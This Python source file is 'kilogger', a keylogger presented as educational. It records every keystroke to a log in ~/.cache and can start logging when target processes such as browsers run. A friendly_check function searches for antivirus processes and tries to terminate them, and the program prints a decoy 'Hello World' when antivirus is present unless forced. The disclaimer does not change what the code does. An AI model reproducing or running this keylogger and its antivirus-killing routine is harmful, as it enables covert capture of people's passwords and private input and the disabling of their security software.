"""
kilogger: A Keylogger Utility for Educational Purposes

Functionalities:
- Capture and log pressed keys.
- Watch processes to trigger keylogger.
- Log clipboard data.
- Stop logger with an HTTP request.

Disclaimer:
kilogger is intended for educational purposes only. It is not designed
for malicious use or unauthorized access. By using this project, you
agree to use it responsibly and ethically.
The developers of this project are not responsible for any misuse of
this tool, and users are responsible for their actions. This project
is provided "as is" without warranties.

Version: 1.0.0
"""

import argparse
import logging
import logging.config
import socket
import sys
import time
from abc import ABC, abstractmethod
from logging.handlers import RotatingFileHandler
from threading import Event, Thread

from kilogger import (CONFIG, DEFAULT_TIMEOUT, LOGLOC, STOP_RESPONSE,
                      install_package, verify_package_installation)

#  Import/Install dependencies
try:
    import psutil
except ImportError:
    install_package('psutil')
    if not verify_package_installation('psutil'):
        sys.exit(1)
    else:
        import psutil

try:
    from pynput.keyboard import Listener
except ImportError:
    install_package('pynput')
    if not verify_package_installation('pynput'):
        sys.exit(1)
    else:
        from pynput.keyboard import Listener

try:
    import requests
except ImportError:
    install_package('requests')
    if not verify_package_installation('requests'):
        sys.exit(1)
    else:
        import requests


class StringToList(argparse.Action):
    """Convert comma-separated string to list"""

    def __call__(self, parser, namespace, values, option_string=None):
        values = list(map(lambda val: val.strip(), values.split(', ')))
        setattr(namespace, self.dest, values)


class PathParser(argparse.Action):
    """Parses the given path from the command line"""

    def __call__(self, parser, namespace, value, option_string=None):
        # It should verify that the given path
        # is for a file, not that it already exists
        setattr(namespace, self.dest, value)


class AutoDestroyHandler(RotatingFileHandler):
    """
    Leverages RotatingFileHandler functionality
    to stop the logger once maxBytes is reached
    """
    def doRollover(self):
        requests.get('http://127.0.0.1:65432/terminate', timeout=5)


class KeyboardManager(ABC):
    """Interface for BaseManager and WatchingManager."""

    @abstractmethod
    def run(self):
        """Runs the logger"""

    @abstractmethod
    def stop(self):
        """Stops the logger"""


class KeyboardListener(Thread):
    """Wrapper around pynput.keyboard.Listener"""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.__k_listener = Listener(on_press=self._action)
        self.__k_listener.daemon = True
        self.__logger = logging.getLogger('kilogger')

    def run(self):
        """Run KLogger daemon"""
        self.__k_listener.start()

    def stop(self):
        """Stop KLogger daemon"""
        self.__k_listener.stop()

    def _action(self, key):
        """Called by pynput.keyboard.Listener when a button is pressed"""
        self.__logger.info(f'> {str(key)}')
        # self.__logger.info()


class BaseManager(KeyboardManager):
    """Interface to start and stop KeyboardListener threads"""
    def __init__(self):
        self.__current: KeyboardListener | None = None

    def run(self):
        """Starts a new KeyboardListener thread"""
        if not self.__current:
            self.__current = KeyboardListener()
            self.__current.start()

    def stop(self):
        """Stops the current running KeyboardListener thread"""
        if self.__current:
            self.__current.stop()
            self.__current = None


class WatchingManager(Thread, KeyboardManager):
    """
    Watches specified "--targets" processes and runs a KeyboardListener
    thread when one of the targets is executed.
    """
    RUNNING = 'Running'
    NOT_RUNNING = 'Not Running'
    STOP = '/terminate'

    STATUS = [
        (NOT_RUNNING, RUNNING),     # turned on
        (RUNNING, RUNNING),         # already on
        (RUNNING, NOT_RUNNING),     # turned off
        (NOT_RUNNING, NOT_RUNNING)  # already off
    ]

    def __init__(self, targets: list, factory: BaseManager, *args,
                 sleep: int = 10, **kwargs):
        super().__init__(*args, **kwargs)

        self.__targets = {t: WatchingManager.STATUS[3] for t in targets}
        self.__logger_factory = factory
        self.__logger_status = WatchingManager.NOT_RUNNING
        self.__logger = logging.getLogger('kilogger')
        self.__sleep = sleep
        self.__stop_event = Event()
        self.daemon = True

    def run(self):
        """
        Checks if the target process is running every `sleep` seconds,
        updates the status [RUNNING, NOT_RUNNING] of the target processes
        and if one of them is running it starts a KeyboardListener with
        BaseListener.
        """
        while True:
            self.find_process()
            active_count = 0
            for tr_process, status in self.__targets.items():
                if status[0] != status[1]:
                    self.__logger.info(f'{status[1]:#>20}: {tr_process:#<20}')

                if status[1] == WatchingManager.RUNNING:
                    active_count += 1

                # found target process in running processes => start logging
                if (status[1] == WatchingManager.RUNNING and
                        self.__logger_status == WatchingManager.NOT_RUNNING):
                    self.__logger_status = WatchingManager.RUNNING
                    self.__logger_factory.run()

            # self.__logger.info(f'[i] Active targets: {active_count}')
            if (active_count == 0 and
                    self.__logger_status == WatchingManager.RUNNING):
                self.__logger_factory.stop()

            # wait to re-execute check
            time.sleep(self.__sleep)

    def stop(self):
        """Called when the termination signal is sent to SocketListener."""
        if self.__logger_status == WatchingManager.RUNNING:
            self.__logger_factory.stop()
        self.__stop_event.set()

    def find_process(self):
        """Updates the status [RUNNING, NOT_RUNNING] of the target processes"""
        snapshot = [p.name().lower() for p in psutil.process_iter(['name'])]
        for tr_process in self.__targets.keys():
            if tr_process in snapshot:
                # Keep state of the previous state
                if self.__targets[tr_process][1] == WatchingManager.NOT_RUNNING:
                    self.__targets[tr_process] = WatchingManager.STATUS[0]
                else:
                    self.__targets[tr_process] = WatchingManager.STATUS[1]
            else:
                if self.__targets[tr_process][1] == WatchingManager.RUNNING:
                    self.__targets[tr_process] = WatchingManager.STATUS[2]
                else:
                    self.__targets[tr_process] = WatchingManager.STATUS[3]


class SocketListener:
    """
    Used to stop a KeyboardManager.
    curl http://127.0.0.1:65432/terminate
    """
    HOST = '127.0.0.1'
    PORT = 65432

    def __init__(self, manager: KeyboardManager):
        self.__log_manager = manager

        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__sock.bind((SocketListener.HOST, SocketListener.PORT))
        self.__sock.listen()
        self.__running = True

        while self.__running:
            conn, addr = self.__sock.accept()
            self.handle(conn, addr)

    def handle(self, conn, addr):
        """
        Responsible for parsing requests, there are two possible outcomes:
        - A request made to any path different to /terminate has no return.
        - A request made to /terminate stops process listener and socket.
        """
        try:
            while True:
                data = conn.recv(1024)
                if not data:
                    break

                request = data.decode('utf-8')
                request_line, headers = request.split('\r\n', 1)
                if WatchingManager.STOP in request_line:
                    self.__log_manager.stop()
                    conn.send(STOP_RESPONSE.encode('utf-8'))
                    conn.close()
                    if self.__sock:
                        self.__running = False
                        self.__sock.close()
                else:
                    conn.close()
        except OSError:
            pass  # skip requests to paths that aren't /terminate


def friendly_check():
    """
    TODO: improve or remove
    """
    # some 'friends' that must be checked
    target_friends = ['msmpeng.exe', 'avgnt.exe', 'avp.exe',
                      'avg.exe', 'bitdefender.exe', 'comodo.exe',
                      'eset.exe', 'f-secure.exe', 'kaspersky.exe',
                      'norton.exe', 'panda.exe', 'sophos.exe',
                      'symantec.exe', 'trendmicro.exe', 'windefender.exe'
                      ]

    target_found = False
    target_killed = False
    for proc in psutil.process_iter(['name']):
        if proc.name().lower() in target_friends:
            target_found = True
            try:
                # terminate always founds a friend but is
                # never able to say goodbye to him :(
                proc.terminate()
                target_killed = True
            except psutil.AccessDenied:
                target_killed = False
    return target_killed or target_found


def main(argv = None):
    """
    Main function of the kilogger program.
    """
    # --- Setup argparse
    if argv is None:
        argv = sys.argv

    parser = argparse.ArgumentParser()

    parser.add_argument(
        '--output',
        default=LOGLOC,
        action=PathParser,
        help='Path for the output log file (ex. ./output.log); '
             'defaults to ~/.cache/report.log'
    )

    parser.add_argument(
        '--force',
        type=int, choices=[0, 1],
        default=None,
        help='0: do not force logger if AV is on. 1: fuck it'
    )

    parser.add_argument(
        '--targets',
        action=StringToList,
        default=[],
        help='Name of target processes (ex. "chrome.exe, firefox.exe"); '
        'note: process names should be separated by ", ".'
    )

    parser.add_argument(
        '--max-bytes',
        type=int,
        default=10000,
        help='Specify the maximum size for logs, defaults to 0.1 MB; '
             'IMPORTANT, when the limit is reached the logger will stop.'
    )

    args = parser.parse_args(argv[1:])

    if ((not (args.force and args.force == 1))
            and friendly_check()):  # big brain time
        print('Hello World')
    else:
        CONFIG['handlers']['file']['filename'] = args.output
        CONFIG['handlers']['file']['maxBytes'] = args.max_bytes
        logging.config.dictConfig(CONFIG)

        # --- Run logger
        logger_factory = BaseManager()
        if args.targets:
            proc_listener = WatchingManager(
                args.targets,
                sleep=DEFAULT_TIMEOUT,
                factory=logger_factory
            )
            proc_listener.start()
            SocketListener(proc_listener)
        else:
            logger_factory.run()
            SocketListener(logger_factory)


if __name__ == "__main__":
    main()
